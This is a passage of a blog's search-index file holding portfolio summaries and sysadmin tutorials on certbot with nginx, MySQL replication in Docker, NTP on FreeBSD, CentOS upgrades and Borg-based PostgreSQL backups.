var store = [{
        "title": "Monitoring system for Docker SLURM cluster",
        "excerpt":"Institute of Continuous Media Mechanics (ICMM UB RAS) has a high-performance cluster consist of about 50 nodes with &gt;400 CPUs and more than 1 TB RAM. It’s needed to make models of new materials and calculate its properties. And in the future, the Institute has plans to upgrade his infrastructure and virtualize his resources to get less dependencies of a hardware layer. The cluster uses Slurm workload manager to run programs on compute nodes. With SLURM many scientist can easy run his programs on the cluster in parallel and independent.   And I should work with these systems. My primary task is to make scripts for deploying virtual compute infrastructure with Docker. My second task is to design and configure a monitoring system to collect and view system statics in the real-time.   Has been developed a script that deploying a simple SLURM configuration with docker-compose. Instead of docker-compose could be used docker stack command with Docker Swarm to deploy containers to a compute nodes with included SLURM software. All information is described on GitHub.   I have used a stack InfluxDB+Grafana, I’ve known good from my previous work, to realize a monitoring system. I use HDF5 profiling plugin for collecting data about runned tasks. This plugin was based of work of the cfenoy user. I’ve modified it to work with the last SLURM version and add gathering some new fields. Also was configured a Grafana dashboard that helps view all statistics about task that have been ever run on the HPC cluster.    docker-slurmbase:   https://github.com/GRomR1/docker-slurmbase   influxdb-slurm-monitoring:   https://github.com/GRomR1/influxdb-slurm-monitoring                                                                                          ","categories": [],
        "tags": [],
        "url": "https://gainanov.pro/eng-blog/portfolio/influxdb-slurm-monitoring/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/influxdb-slurm-monitoring/influxdb-slurm-monitoring-teaser.png"
      },{
        "title": "Computer-aided system to control a moving of a robotic system in an environment with obstacles",
        "excerpt":"In my last course of the University, I’ve decided to help my department to create a model that will simulate the real system for scanning details in many angles. The main purpose of the work is to find an algorithm to move robots by path without collision to each other and the environment. I use V-REP system to design models and to solve inverse and forward kinematics tasks of together motion two robots. In the picture gallery is present models are consisting of two main robots is a manipulator (in the picture it is a “1”) and a frame robot (“2”). Also has a table robot (“3”) that rotates a detail (“4”).   Maybe it is not a work for IT or programmer but I was exploring many science articles and approaches, studying it to make a good thesis of a scientific work and presents it to a commission of the University. And also I’ve learned the basics in Lua language.   I’ve uploaded the source code of the project into Github. Also you can view the video of a scanning process of a detail.                                                                                                                               ","categories": [],
        "tags": [],
        "url": "https://gainanov.pro/eng-blog/portfolio/robot-motion-system/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/robot-motion/robot-motion-main-min.png"
      },{
        "title": "Visualization of cloud resources utilization",
        "excerpt":"To visualize statistics on a distribution of resources of the JINR cloud the Grafana system was chosen. It provides a user-friendly interface through a web browser displaying various kinds of statistical metrics in real-time, gives flexible and functional ways to customize the layout of charts and graphs.   As data-storage to store gathering information from OpenNebula was chosen InfluxDB. It is an open source database specifically to handle time series data with high availability and high performance requirements. InfluxDB is meant to be used as a backend storage for many use cases involving large amounts of timestamped data, including DevOps monitoring, application metrics and real-time analytics. It has a simple, high performing write and query HTTP(S) APIs.                                                                                                                                Developed dashboards       ","categories": [],
        "tags": [],
        "url": "https://gainanov.pro/eng-blog/portfolio/visualisation-jinr-cloud/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/visualisation-jinr-cloud/visualisation-jinr-cloud-scheme-th-min.png"
      },{
        "title": "Add a free SSL certificate to NGINX server",
        "excerpt":"Let’s Encrypt provides an easy way to obtain and install free TLS/SSL certificates, thereby enabling encrypted HTTPS on web servers. It simplifies the process by providing a software client, Certbot, that attempts to automate most (if not all) of the required steps.   In this article I will show you how to use the certbot Let’s Encrypt client to obtain a free SSL certificate and use it with Nginx on CentOS 7. I will also show you how to automatically renew your SSL certificate.   Prerequisites  Before following this tutorial, you’ll need a few things.     CentOS 7 server.   DNS A Record that points your domain to the public IP address of your server.   Once you have all of the prerequisites out of the way, let’s move on to installing the Let’s Encrypt client software.   Instructions   Install and configure nginx   yum -y install nginx   Add server name to nginx config file. Next a minimal configures that you need to get certificates  stored in file /etc/nginx/nginx.conf:  http {     server {         listen       80 default_server;         server_name  example.com;          location ~ ^/(.well-known/acme-challenge/.*)$ { \t        root     /usr/share/nginx/html; \t    } \t    location / { \t       ... \t    }     } }  Install and configure Certbot   The official Let’s Encrypt client is called Certbot, and it is included in the EPEL repository. Install Certbot with yum:  yum -y install certbot certbot-nginx   Obtaining a Certificate   Certbot provides a variety of ways to obtain SSL certificates, through various plugins. This runs certbot with the --nginx plugin, using -d to specify the names we’d like the certificate to be valid for. If this is your first time running certbot, you will be prompted to enter an email address and agree to the terms of service. After doing so, certbot will communicate with the Let’s Encrypt server, then run a challenge to verify that you control the domain you’re requesting a certificate for.   I suggest you a simple command that will obtain a certifiacte without any questions and outputs:  certbot certonly --webroot           \\ -d example.com                       \\ --webroot-path /usr/share/nginx/html \\ --email your_email@example.com       \\ --post-hook \"systemctl reload nginx\" \\ --agree-tos                          \\ --quiet   But you can yet view logs placed on path /var/log/letsencrypt/letsencrypt.log   To show information about obtained certificates use command certbot certificates:  # certbot certificates Saving debug log to /var/log/letsencrypt/letsencrypt.log ------------------------------------------------------------------------------- Found the following certs:   Certificate Name: example.com     Domains: example.com     Expiry Date: 2018-05-03 04:20:43+00:00 (VALID: 89 days)     Certificate Path: /etc/letsencrypt/live/example.com/fullchain.pem     Private Key Path: /etc/letsencrypt/live/example.com/privkey.pem -------------------------------------------------------------------------------   The certificate is storing on the disk by path /etc/letsencrypt/live/example.com:  # ll /etc/letsencrypt/live/example.com total 4 lrwxrwxrwx. 1 root root  37 Feb  2 08:45 cert.pem -&gt; ../../archive/example.com/cert1.pem lrwxrwxrwx. 1 root root  38 Feb  2 08:45 chain.pem -&gt; ../../archive/example.com/chain1.pem lrwxrwxrwx. 1 root root  42 Feb  2 08:45 fullchain.pem -&gt; ../../archive/example.com/fullchain1.pem lrwxrwxrwx. 1 root root  40 Feb  2 08:45 privkey.pem -&gt; ../../archive/example.com/privkey1.pem -rw-r--r--. 1 root root 543 Feb  2 08:45 README   In file README consists next description:  This directory contains your keys and certificates.  `privkey.pem`  : the private key for your certificate. `fullchain.pem`: the certificate file used in most server software. `chain.pem`    : used for OCSP stapling in Nginx &gt;=1.3.7. `cert.pem`     : will break many server configurations, and should not be used                  without reading further documentation (see link below).   Additional information are available on the certbot site.   Revoke a Certificate   If you didn’t want use generated certificates any more just revoke it:  certbot revoke                                              \\ --cert-path /etc/letsencrypt/live/example.com/fullchain.pem \\ --delete-after-revoke                                       \\ --quiet  I use a --quiet parameter if you want see a result of certbot revoke just run it without this option:  # certbot revoke --cert-path /etc/letsencrypt/live/example.com/fullchain.pem Saving debug log to /var/log/letsencrypt/letsencrypt.log Starting new HTTPS connection (1): acme-v01.api.letsencrypt.org ------------------------------------------------------------------------------- Would you like to delete the cert(s) you just revoked? ------------------------------------------------------------------------------- (Y)es (recommended)/(N)o: y ------------------------------------------------------------------------------- Deleted all files relating to certificate ems.insyte.ru. ------------------------------------------------------------------------------- ------------------------------------------------------------------------------- Congratulations! You have successfully revoked the certificate that was located at /etc/letsencrypt/live/example.com/fullchain.pem -------------------------------------------------------------------------------   Renew a Certificate   Let’s Encrypt’s certificates are only valid for ninety days. This is to encourage users to automate their certificate renewal process. We’ll need to set up a regularly run command to check for expiring certificates and renew them automatically.   To run the renewal check daily, we will use cron, a standard system service for running periodic jobs.   We tell cron what to do by opening and editing a file called a crontab crontab -e:  15 3 * * * /usr/bin/certbot renew --post-hook \"systemctl reload nginx\" --quiet   The line runs the following command at 3:15 am, every day.   The renew command for Certbot will check all certificates installed on the system and update any that are set to expire in less than thirty days. After a renew process has completed a nginx server will been reload.   All installed certificates will be automatically renewed and reloaded when they have thirty days or less before they expire.   Read docs to get information about command line options.   Additional information     How To Secure Nginx with Let’s Encrypt on CentOS 7 - DigitalOcean   User Guide — Certbot documentation   Nginx on CentOS/RHEL 7 — Certbot   ","categories": ["linux"],
        "tags": ["ssl","nginx","centos","letsencrypt"],
        "url": "https://gainanov.pro/eng-blog/linux/free-ssl-certbot-nginx-setup/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/free-ssl-certbot-nginx-setup-teaser.png"
      },{
        "title": "MySQL Master-Slave replication with a Docker",
        "excerpt":"In this article was described a simple configuration of MySQL Master-Slave replication with using Docker containers.   Prepare   Let’s begin. Firstly we need to write both basic configurations (in file 10-mysqld.cnf):  # The MySQL Server configuration file.  # http://dev.mysql.com/doc/mysql/en/server-system-variables.html  [mysqld] pid-file = /var/run/mysqld/mysqld.pid  socket = /var/run/mysqld/mysqld.sock  datadir = /var/lib/mysql symbolic-links = 0    After that create catalogs to store master and slave configures. I.e. master-config and slave-config in a root home directory. And copy the file 10-mysqld.cnf into the dirs.   Configure master   Next we writing master configurations that stored in master-config\\60-enable-replication.cnf (the number 60- is used to define a order to load config files, the name of file is not important):  [mysqld]  server-id = 1 # the number of server, that be unical  log-bin = mysql-bin # the name of binary log binlog_do_db = test_db # the name of replication database   Start master server   Run docker master container that based of official MySQL image and exposed port 33060:  docker run -d --rm --name mysql-master \\     -p 33060:3306 \\     -e MYSQL_ROOT_PASSWORD=root_secret -e MYSQL_DATABASE=test_db \\     -v /root/db_master:/var/lib/mysql \\     -v /root/master-config:/etc/mysql/mysql.conf.d \\     mysql   We can map the existing data that stored in /root/db_master  or create new database and  keep db files into this dir.   Now enter the container from command prompt and connect to created database:  docker exec -ti mysql-master /bin/bash root@c337863c7d3e:/# mysql -proot_secret mysql&gt;   Create replica user   Create new replication user replica with grants REPLICATION SLAVEin mysql console:  CREATE USER 'replica'@'%' IDENTIFIED BY 'replica_strong_password'; GRANT REPLICATION SLAVE ON *.* TO 'replica'@'%'; FLUSH PRIVILEGES;   Dump database   Dump selected database and copy it to the slave. Before we should block any user connection to modify data:  FLUSH TABLES WITH READ LOCK; SET GLOBAL read_only = ON;   Run mysqldump command to create dump database. I run it on my host computer that having IP address 192.168.0.161:  mysqldump -h 192.168.0.161 -P 33060 -u root -proot_secret test_db &gt; test_db.sql   Before unlock database don’t forget check last binary log position with command SHOW MASTER STATUS  mysql&gt; SHOW MASTER STATUS; +------------------+----------+--------------+------------------+ | File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | +------------------+----------+--------------+------------------+ | mysql-bin.000001 |      107 | test_db      |                  | +------------------+----------+--------------+------------------+ 1 row in set (0.00 sec)   After that you can unlock database:  SET GLOBAL read_only = OFF; UNLOCK TABLES;   Configure slave   Create file slave-config\\60-enable-replication.cnf and input next rows to it:  [mysqld] server-id          = 2           # Slave server ID (next after Master) relay_log          = mysql-relay  log_bin            = mysql-bin   binlog_do_db       = test_db      read_only          = 1           # The Slave will work only in read-only mode   Run slave server   Run container that will be slave server and link it to the mysql-master container:  docker run -d --rm --name mysql-slave \\     --link mysql-master:db \\     -p 33061:3306 \\     -e MYSQL_ROOT_PASSWORD=root_secret -e MYSQL_DATABASE=test_db \\     -v /root/db_slave:/var/lib/mysql \\     -v /root/slave-config:/etc/mysql/mysql.conf.d \\     mysql   Instead of linking containers you can use the host IP and exposed port to the master container (33060).   Deploy master dump   Deploy the created dump to the slave server:  mysql -h 192.168.0.161 -P 33061 -u root -proot_secret test_db &lt; test_db.sql   Go into the container of the slave server:  docker exec -ti mysql-slave /bin/bash root@53378642dd3a:/# mysql -proot_secret mysql&gt;   And run the command [CHANGE MASTER TO][change_to] to write a connection to the master in MySQL console with information that we has input early on the master:  CHANGE MASTER TO MASTER_HOST='db', MASTER_USER='replica', MASTER_PASSWORD='replica_strong_password', MASTER_LOG_FILE = 'mysql-bin.000001', MASTER_LOG_POS = 107;   And finally start replication:  START SLAVE;   To check the status of replication use next command:  mysql&gt; SHOW SLAVE STATUS\\G *************************** 1. row ***************************                Slave_IO_State: Waiting for master to send event                   Master_Host: db                   Master_User: replica                   Master_Port: 3306                 Connect_Retry: 60               Master_Log_File: mysql-bin.000002           Read_Master_Log_Pos: 4133                Relay_Log_File: mysql-relay.000003                 Relay_Log_Pos: 4346         Relay_Master_Log_File: mysql-bin.000002              Slave_IO_Running: Yes             Slave_SQL_Running: Yes               Replicate_Do_DB:           Replicate_Ignore_DB:            Replicate_Do_Table:        Replicate_Ignore_Table:       Replicate_Wild_Do_Table:   Replicate_Wild_Ignore_Table:                    Last_Errno: 0                    Last_Error:                  Skip_Counter: 0           Exec_Master_Log_Pos: 4133               Relay_Log_Space: 4715               Until_Condition: None                Until_Log_File:                 Until_Log_Pos: 0            Master_SSL_Allowed: No            Master_SSL_CA_File:            Master_SSL_CA_Path:               Master_SSL_Cert:             Master_SSL_Cipher:                Master_SSL_Key:         Seconds_Behind_Master: 0 Master_SSL_Verify_Server_Cert: No                 Last_IO_Errno: 0                 Last_IO_Error:                Last_SQL_Errno: 0                Last_SQL_Error:   Replicate_Ignore_Server_Ids:              Master_Server_Id: 1                   Master_UUID: 23b67d70-fab5-11e7-ac09-0242ac11000f              Master_Info_File: /var/lib/mysql/master.info                     SQL_Delay: 0           SQL_Remaining_Delay: NULL       Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates            Master_Retry_Count: 86400                   Master_Bind:       Last_IO_Error_Timestamp:      Last_SQL_Error_Timestamp:                Master_SSL_Crl:            Master_SSL_Crlpath:            Retrieved_Gtid_Set:             Executed_Gtid_Set:                 Auto_Position: 0          Replicate_Rewrite_DB:                  Channel_Name:            Master_TLS_Version: 1 row in set (0.00 sec)  ","categories": ["linux"],
        "tags": ["docker","mysql","linux"],
        "url": "https://gainanov.pro/eng-blog/linux/mysql-replication/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/mysql-replication-teaser.jpg"
      },{
        "title": "Install and configure NTP on FreeBSD 11",
        "excerpt":"In this article will be described what use NTP to synchronize system time on FreeBSD. I use FreeBSD 11 that ran as VPS in Hetzner cloud.   Previously you should check what version is installed on your machine. Use for this command ntpd --version. Result:  ntpd 4.2.8p10-a (1)   If you have NTP server that version is less 4.2.7 you should update it because you might be attacked.   Using a portsnap to update your local ports:  portsnap fetch extract portsnap fetch update   After that instal zoneinfo package and copy selected local zone to change your timezone (my zone is Europe/Moscow:  cd /usr/ports/misc/zoneinfo &amp;&amp; make install clean cp /usr/share/zoneinfo/Europe/Moscow /etc/localtime   Editing your NTP configuration file /etc/ntp.conf:  restrict default kod nomodify notrap nopeer noquery restrict -6 default kod nomodify notrap nopeer noquery  restrict 127.0.0.1 restrict -6 ::1  server ntp1.hetzner.de iburst server ntp2.hetzner.de iburst server ntp3.hetzner.de iburst   Don’t forget setup your servers in these parameters:     server ntp#.hetzner.de iburst – use this server to synchronize time; iburst keyword allows to speed up first connection   And now only need to add a command that will allow running NTP on startup (rc.conf):  echo ntpd_enable=\\\"YES\\\" &gt;&gt; /etc/rc.conf echo ntpd_sync_on_start=\\\"YES\\\" &gt;&gt; /etc/rc.conf   Parameter ntpd_sync_on_start is setting YES to syncs the system’s clock\ton startup and to remove a restriction a lot time offset.   Finally lets start a local NTP server:  /etc/rc.d/ntpd start   Some moments ago your local system time will update and you can check a status on this:  # ntpq -p remote refid st t when poll reach delay offset jitter ============================================================================== +ntp1.hetzner.de 192.53.103.108 2 u 1 64 1 2.864 -0.889 0.153 +ntp2.hetzner.de 192.53.103.108 2 u 4 64 1 0.328 0.219 0.114 *ntp3.hetzner.de 192.53.103.108 2 u 2 64 1 0.306 0.832 0.092  # ntpdate -q localhost server 127.0.0.1, stratum 3, offset -0.000008, delay 0.02568 server ::1, stratum 3, offset 0.000005, delay 0.02571 ntpdate[52224]: adjust time server 127.0.0.1 offset -0.000008 sec   If you want to sync onetime use this command:  # ntpdate -v -b ntp1.hetzner.de ntpdate[11356]: ntpdate 4.2.8p10-a (1) ntpdate[11356]: step time server 213.239.239.164 offset 0.004194 sec   Additional information:  This links might useful to get any additional information:     Hetzner - Install the NTP daemon   ntpd – NTP daemon\tprogram    ntp.conf – Network Time Protocol (NTP) daemon configuration file format   Синхронизация часов через NTP   Настройка ntpdate/ntpd на FreeBSD 10   Атака с помощью вашего сервера времени: NTP amplification attack (CVE-2013-5211)   ","categories": ["sysad"],
        "tags": ["ntp","freebsd"],
        "url": "https://gainanov.pro/eng-blog/sysad/ntp-freebsd-setup/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/ntp-freebsd-setup.png"
      },{
        "title": "Upgrade kernel of CentOS 7 to latest version",
        "excerpt":"Previously I was writing about upgrading system now  I will show how to upgrade the CentOS7 kernel to the latest version. Using ELRepo repository we can get easy kernel updates.  ELRepo is focused on the packages related to hardware,  including filesystem drivers, graphic drivers, network drivers, sound card drivers, webcam, and others.   Instructions   Check the current kernel version.  # uname -sr Linux 4.11.3-1.el7.elrepo.x86_64   If we now go to , we will see that the latest kernel version is 4.15 at the time of this writing  (other versions are available from the same site).   To enable the ELRepo repository on CentOS 7, do  rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-3.el7.elrepo.noarch.rpm    Next, install the latest mainline stable kernel  yum --enablerepo=elrepo-kernel install kernel-ml   I had this output of that command  # yum --enablerepo=elrepo-kernel install kernel-ml Loaded plugins: fastestmirror, langpacks elrepo-kernel                                                                                                                                                          | 2.9 kB  00:00:00 elrepo-kernel/primary_db                                                                                                                                               | 1.7 MB  00:00:01 Loading mirror speeds from cached hostfile  * base: mirror.reconn.ru  * elrepo: nl.mirror.babylon.network  * elrepo-kernel: nl.mirror.babylon.network  * epel: mirror.logol.ru  * extras: mirror.reconn.ru  * updates: mirror.reconn.ru Resolving Dependencies --&gt; Running transaction check ---&gt; Package kernel-ml.x86_64 0:4.15.8-1.el7.elrepo will be installed --&gt; Finished Dependency Resolution  Dependencies Resolved  ==============================================================================================================================================================================================  Package                                    Arch                                    Version                                              Repository                                      Size ============================================================================================================================================================================================== Installing:  kernel-ml                                  x86_64                                  4.15.8-1.el7.elrepo                                  elrepo-kernel                                   44 M  Transaction Summary ============================================================================================================================================================================================== Install  1 Package  Total download size: 44 M Installed size: 198 M Is this ok [y/d/N]: y Downloading packages: kernel-ml-4.15.8-1.el7.elrepo.x86_64.rpm                                                                                                                               |  44 MB  00:00:05 Running transaction check Running transaction test Transaction test succeeded Running transaction   Installing : kernel-ml-4.15.8-1.el7.elrepo.x86_64                                                                                                                                       1/1   Verifying  : kernel-ml-4.15.8-1.el7.elrepo.x86_64                                                                                                                                       1/1  Installed:   kernel-ml.x86_64 0:4.15.8-1.el7.elrepo  Complete!   Next, reboot your machine to apply the latest kernel  systemctl reboot   If you just reboot the system and run command to check the version of your kernel  # uname -sr Linux 4.11.3-1.el7.elrepo.x86_64   You will see your current kernel. WTF? But I updated it. Your system will be updated but to run the system with new kernel need configure Grub loader.   Let’s check the current configuration  # awk -F\\' '$1==\"menuentry \" {print i++ \" : \" $2}' /etc/grub2.cfg 0 : CentOS Linux (4.15.8-1.el7.elrepo.x86_64) 7 (Core) 1 : CentOS Linux (4.11.3-1.el7.elrepo.x86_64) 7 (Core) 2 : CentOS Linux (0-rescue-d39b765b9cf142baa7ed9ca6543375de) 7 (Core)   As you can see the new kernel has the second option in the loading process. We want to use kernel 4.15 as our default, so you can use the following command to make this happen.  grub2-set-default 0   When you want to revert back to the old kernel,  you can change the value of the grub2-set-default command to 1.   Finally, generate the grub2 config with gurb2-mkconfig command, and then reboot the server.  grub2-mkconfig -o /boot/grub2/grub.cfg systemctl reboot   After system will load check again the kernel version  # uname -sr Linux 4.15.8-1.el7.elrepo.x86_64   Excellent! We have the latest kernel.   Of course, don’t do this procedure on a system with users.   Additional information     How to Upgrade Kernel on CentOS 7   How to Install or Upgrade to Kernel 4.15 in CentOS 7   ","categories": ["linux"],
        "tags": ["centos"],
        "url": "https://gainanov.pro/eng-blog/linux/upgrade-centos-kernel/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/upgrade-centos-kernel.png"
      },{
        "title": "Upgrade CentOS 7.x to latest version",
        "excerpt":"Usually, you want to use the last version of the operating system and if it is true you will update your OS early or later. In this article, you can found a simple and small instruction to update Centos 7 from 7.x to the latest version (now it is 7.4) See CentOS 7.4 release note for more information about changes.   Instructions   Check the current version  # cat /etc/redhat-release CentOS Linux release 7.3.1611 (Core)   Upgrading is the same as the update option with -obsoletes flag. Before upgrading purge all old cache and download a new one. And next, you can upgrade OS.  yum clean all yum makecache yum -y upgrade   Below is described info that I got (I left only main info)  # yum clean all ... Cleaning up everything Cleaning up list of fastest mirrors  # yum makecache ... Metadata Cache Created  # yum -y upgrade ... Complete!   After the upgrade process has completed seeing changes reboot a system  systemctl reboot   And repeat to check the current version of the system  # cat /etc/redhat-release CentOS Linux release 7.4.1708 (Core)   Of course, don’t do this procedure on a system with users.   Additional information     Upgrading from CentOS 7.3 to 7.4   How to Update CentOS 7.0/7.1/7.2/7.3 to CentOS 7.4   ","categories": ["linux"],
        "tags": ["centos"],
        "url": "https://gainanov.pro/eng-blog/linux/upgrade-centos/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/upgrade-centos.jpg"
      },{
        "title": "Create daily database backups with Borg",
        "excerpt":"In this post, I want to describe a creating backup of PostgreSQL database and transferring it to a remote server. I will show you how to automate it to get regular daily backup and use a deduplication tool as Borgbackup for effective using storage. Also, the tool has methods for encryption your data and I will show how to use it.  Backup database to borg repository is the efficient and secure way to store your critically important data.   Prerequisites   Before following this tutorial, you should understand conditions that I have:     Has two Linux servers:            one is a backup remote storage       second is a database server           I will use Centos 7 on the remote server, and Ubuntu 16.04 on another server with installed PostgreSQL 9.6. They both have connections to one network, an IP of Centos is 192.168.0.1 and Ubuntu has 192.168.0.2. Backup server has a special backup user with name backup_user   Instructions   Install borg on both servers   Is a simple action just use apt or yum install:  apt install borgbackup   And checking your version after that borg --version.  Centos: borg 1.1.4 Ubuntu: borg 1.0.11   Ok, some differences can’t a problem with using it. If you want to use the last version follow this installing instruction. But didn’t use the version before 1.0.9 because that has a vulnerability.   Official docs have a good description of basic usage a borg commands and options,  see them for best understanding next commands.   Configure access to the backup server   Generate ssh key to remote access to the backup server if you don’t get it.  ssh-keygen -b 2048 -t rsa -q -N '' -f ~/.ssh/id_rsa   Create a config file if you don’t want to remember an IP of the remote server like me.  cat &lt;&lt; EOT &gt;&gt; ~/.ssh/config Host backup_server User backup_user HostName 192.168.0.1 Port 22 EOT   And run command to copy generated public key to the remote server.  ssh-copy-id backup_server   Test it.  # ssh backup_server Last login: Sun Apr 15 10:18:16 2018 [backup_user@backup_server ~]$   All is OK.   Create a backup script   Ok, let’s begin to automate the process of creating a backup of the database. I am using a pg_dumpall to create a backup of a full database. A result of this command a SQL-file that can create all existing databases and users in a new place. This result before coping will been stored on local path /root/db_dumps. Also I make backup of database configs.   #!/bin/bash BACKUP_DIR=/root/db_dumps BACKUP_DUMP_NAME=\"dump_$(date '+%Y-%m-%d_%H%M%S').sql\" BACKUP_CONFIG_NAME=\"config_$(date '+%Y-%m-%d_%H%M%S').tar.gz\" USERNAME=postgres BORG_CMD=\"borgmatic\" DB_CONF_PATH=\"/etc/postgresql/9.6/main\"  error_exit() {   echo \"$1\" 1&gt;&amp;2   exit 1 }  debug_message() {     echo \"$1\" 1&gt;&amp;2 }  debug_message \"[backup][START] Start creating backup\"  #remove previous backup [[ -d ${BACKUP_DIR} ]] &amp;&amp;  rm -rf ${BACKUP_DIR} [[ ! -d ${BACKUP_DIR} ]] &amp;&amp; mkdir ${BACKUP_DIR} &amp;&amp; chmod 700 ${BACKUP_DIR}  #backup database data cd ${BACKUP_DIR} if ! pg_dumpall -U \"$USERNAME\" --file=${BACKUP_DUMP_NAME}; then   error_exit \"[backup][ERROR] Failed to produce data backup\" else   debug_message \"[backup][SUCCESS] Data backup success created\" fi  #backup database configures cd ${DB_CONF_PATH} if ! tar -cvzf ${BACKUP_CONFIG_NAME} *.conf &gt; /dev/null 2&gt;&amp;1; then   error_exit \"[backup][ERROR] Cannot create archive with PG conf files\" else   [[ -f ${BACKUP_CONFIG_NAME} ]] &amp;&amp;  mv ${BACKUP_CONFIG_NAME} ${BACKUP_DIR}   debug_message \"[backup][SUCCESS] Config files success created\" fi  #copy to backup server if ! ${BORG_CMD} ; then   error_exit \"[backup][ERROR] Failed copy to backup server\" else   debug_message \"[backup][SUCCESS] Data backup success copied\" fi   #remove local backup files #none  debug_message \"[backup][COMPLETE] Backup success created\"   I saved this script in the database server by path /opt/postgres_backup.sh. And set execute rights to file (chmod 700 /opt/postgres_backup.sh).   BorgBackup command   In my script has been a variable BORG_CMD is a wrapper of Borgbackup - borgmatic. It initiates a backup, prunes any old backups according to a retention policy, and validates backups for consistency. The script supports specifying your settings in a declarative configuration file rather than having to put them all on the command-line and handles common errors.   To install borgmatic use pip3:  pip3 install --upgrade borgmatic   Borgmatic settings   The settings of borgmatic is stored on /etc/borgmatic/config.yaml. And my ones to our task are described below.  location:     source_directories:         - /root/db_dumps      repositories:         - backup_server:/backups/db  storage:     encryption_passcommand: \"cat /root/.borg-passphrase\"  retention:     keep_daily: 30     keep_weekly: 12     keep_monthly: 6  consistency:     checks:         - repository         - archives     check_last: 7   Create a passphrase on the database server   Next command creating a key file to use as a passphrase of an encrypted repository. Borg are using system environments to get some parameters. This one show borg how to get a passphrase to either new or existing repository.  head -c 1024 /dev/urandom | base64 &gt; /root/.borg-passphrase chmod 400 /root/.borg-passphrase export BORG_PASSCOMMAND=\"cat /root/.borg-passphrase\"   Create a repository on the backup server   Using a repokey modes to “passphrase-only” security. The key will be stored inside the repository (in its “config” file). In above mentioned attack scenario, the attacker will have the key (but not the passphrase).  # borg init --encryption=repokey backup_server:/backups/db  By default repositories initialized with this version will produce security errors if written to with an older version (up to and including Borg 1.0.8).  If you want to use these older versions, you can disable the check by running: borg upgrade --disable-tam db_test  See https://borgbackup.readthedocs.io/en/stable/changes.html#pre-1-0-9-manifest-spoofing-vulnerability for details about the security implications.   The output has some warnings about a using old version.   Create a deamon to automate running a backup script   Ubuntu has a nice mechanism to auto-running scripts or applications in the background. His name - SystemD. And if exists a necessity to run a script by a scheduler (i.e. every night) you should use timers that is part of systemd.   I write my own daemon  to run an above script. It has stored on /etc/systemd/system/backup.service.  [Unit] Description=Backup PostgreSQL database  [Service] Type=oneshot ExecStart=/bin/bash /opt/postgres_backup.sh   And I has a timer unit that runs a backup.service every day at midnight  [Unit] Description=Run backup script every day at midnight  [Timer] OnCalendar=daily  [Install] WantedBy=timers.target   After that you should reload daemon-service.  systemctl daemon-reload   Manual run script and view logs   To run our systemd unit (or daemon) just run next command on a terminal:  systemctl start backup   And anfter this command completed view logs by journalctl -u backup  Apr 14 11:07:48 ubuntu systemd[1]: Starting Backup PostgreSQL database... Apr 14 11:07:48 ubuntu bash[234]: [backup][START] Start creating backup Apr 14 11:08:48 ubuntu bash[234]: [backup][SUCCESS] Data backup success created Apr 14 11:08:48 ubuntu bash[234]: [backup][SUCCESS] Config files success created Apr 14 11:10:27 ubuntu bash[234]: [backup][SUCCESS] Data backup success copied Apr 14 11:10:27 ubuntu bash[234]: [backup][COMPLETE] Backup success created Apr 14 11:10:27 ubuntu systemd[1]: Started Backup PostgreSQL database.   Finish preparations and check the results   Don’t forget setup enable flag on the timer for working them after reboot system.  systemctl enable backup.timer systemctl start backup.timer   And check active system timers with systemctl list-timers.  NEXT                         LEFT     LAST                         PASSED       UNIT                         ACTIVATES Mon 2018-04-16 00:00:00 MSK  9h left  Sun 2018-04-15 00:00:52 MSK  14h ago      backup.timer                 backup.service ...  5 timers listed.   Ok, I just run a backup script two times on my database and have got two backups.  # borg list backup_server:/backups/db ubuntu-2018-04-15T00:05:46.344337 Sun, 2018-04-15 00:05:28 ubuntu-2018-04-15T00:08:46.344337 Sun, 2018-04-15 00:08:47   Let’s see the information about second one.  # borg info backup_server:/backups/db::ubuntu-2018-04-15T00:08:46.344337 Name: ubuntu-2018-04-15T00:08:46.344337 Fingerprint: 19314fb992f83d9e746eda534d22fc8375a8d20c0cf8828a4353463574asdw Hostname: ubuntu Username: root Time (start): Sun, 2018-04-15 00:08:47 Time (end):   Sun, 2018-04-15 00:08:47 Number of files: 2                         Original size      Compressed size    Deduplicated size This archive:                8.50 GB              8.50 GB                624 B All archives:               17.00 GB             17.00 GB              6.64 GB                         Unique chunks         Total chunks Chunk index:                    2548                 6750   One dump file has a size of 8G, but repository using deduplication stores two ones with less disk usage space. All archives has reduce about 6,6G. Next command will agree this words  backup_server &gt;# du -hd0 /backups/db 6,2G    db   And at the end, I want to show the command that extracts (“restore”) backup from an archive repository to a local path.  mkdir old_data cd old_data borg extract backup_server:/backups/db::ubuntu-2018-04-15T00:08:46.344337   In conclucion I want to say that the Borg is a simple, reliable and secure tool to store your backup data. The data deduplication technique used makes Borg suitable for daily backups since only changes are stored. The authenticated encryption technique makes it suitable for backups to not fully trusted targets. And it has a simple interface to run with many parameters with borgmatic.   Additional information:   This links might useful to get any additional information:     Borg by Thomas Waldmann   BorgBackup Offsite   borgmatic Offsite   Is Borg backup suitable for the production?   ","categories": ["linux"],
        "tags": ["postgres"],
        "url": "https://gainanov.pro/eng-blog/linux/database-backup-with-borg/",
        "teaser": null
      },{
        "title": "Tasks of Linux contest in IT-Planet",
